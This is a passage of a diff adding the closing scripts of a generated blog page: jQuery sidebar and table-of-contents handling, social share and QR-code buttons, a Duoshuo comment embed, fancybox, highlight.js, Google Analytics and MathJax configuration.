+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ragingcat"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<style type="text/css">
+</style>
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script><script type="text/javascript">
+$(document).ready(function(){
+    $('pre').each(function(i, block) {
+      hljs.highlightBlock(block);
+    });
+    $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-60243036-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript"
+   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+  </body>
+</html>
